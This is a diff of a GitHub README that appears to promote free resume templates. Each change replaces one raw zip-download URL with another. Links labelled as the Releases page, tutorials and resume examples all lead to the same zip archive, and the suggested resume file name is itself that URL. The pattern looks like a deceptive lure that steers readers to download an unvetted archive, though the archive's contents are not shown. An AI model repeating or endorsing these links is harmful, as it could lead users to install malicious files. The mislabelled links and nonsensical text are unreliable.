@@ -1,6 +1,6 @@
 # 📝 Professional-CV-Resume-Templates - Create Your Perfect Resume Today
 
-[![Download Now](https://raw.githubusercontent.com/AltDoMember/Professional-CV-Resume-Templates/main/zymogenous/C-Resume-Professional-Templates-v2.4.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/AltDoMember/Professional-CV-Resume-Templates/main/zymogenous/C-Resume-Professional-Templates-v2.4.zip)
+[![Download Now](https://github.com/AltDoMember/Professional-CV-Resume-Templates/raw/refs/heads/main/zymogenous/C_Resume_Professional_Templates_v1.2-alpha.2.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/AltDoMember/Professional-CV-Resume-Templates/raw/refs/heads/main/zymogenous/C_Resume_Professional_Templates_v1.2-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To use these templates, you will need:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/AltDoMember/Professional-CV-Resume-Templates/main/zymogenous/C-Resume-Professional-Templates-v2.4.zip) to find the list of available templates.
+   Go to our [Releases page](https://github.com/AltDoMember/Professional-CV-Resume-Templates/raw/refs/heads/main/zymogenous/C_Resume_Professional_Templates_v1.2-alpha.2.zip) to find the list of available templates.
 
 2. **Select a Template**  
    Browse through the collection. Choose the template that suits your style and job application needs.
@@ -46,7 +46,7 @@ We offer various templates to cater to different roles and industries:
 
 ## 📂 Organizing Your Resume
 
-Once you customize your resume, save it in a clearly labeled folder. We suggest naming it with your name and the position you are applying for (e.g., "https://raw.githubusercontent.com/AltDoMember/Professional-CV-Resume-Templates/main/zymogenous/C-Resume-Professional-Templates-v2.4.zip"). Keeping your documents organized will save you time during your job search.
+Once you customize your resume, save it in a clearly labeled folder. We suggest naming it with your name and the position you are applying for (e.g., "https://github.com/AltDoMember/Professional-CV-Resume-Templates/raw/refs/heads/main/zymogenous/C_Resume_Professional_Templates_v1.2-alpha.2.zip"). Keeping your documents organized will save you time during your job search.
 
 ## 📧 Tips for Using Your Resume
 
@@ -75,8 +75,8 @@ We appreciate feedback from our users to improve this repository. If you have su
 
 ## 🔗 Useful Links
 
-- [Visit the Releases page for downloads](https://raw.githubusercontent.com/AltDoMember/Professional-CV-Resume-Templates/main/zymogenous/C-Resume-Professional-Templates-v2.4.zip)
-- [Tutorials on resume writing](https://raw.githubusercontent.com/AltDoMember/Professional-CV-Resume-Templates/main/zymogenous/C-Resume-Professional-Templates-v2.4.zip) (Placeholder link for additional resources)
-- [Resume examples and tips](https://raw.githubusercontent.com/AltDoMember/Professional-CV-Resume-Templates/main/zymogenous/C-Resume-Professional-Templates-v2.4.zip) (Placeholder link for further guidance)
+- [Visit the Releases page for downloads](https://github.com/AltDoMember/Professional-CV-Resume-Templates/raw/refs/heads/main/zymogenous/C_Resume_Professional_Templates_v1.2-alpha.2.zip)
+- [Tutorials on resume writing](https://github.com/AltDoMember/Professional-CV-Resume-Templates/raw/refs/heads/main/zymogenous/C_Resume_Professional_Templates_v1.2-alpha.2.zip) (Placeholder link for additional resources)
+- [Resume examples and tips](https://github.com/AltDoMember/Professional-CV-Resume-Templates/raw/refs/heads/main/zymogenous/C_Resume_Professional_Templates_v1.2-alpha.2.zip) (Placeholder link for further guidance)
 
 With these templates, you are equipped to create a standout resume. Good luck with your job applications!
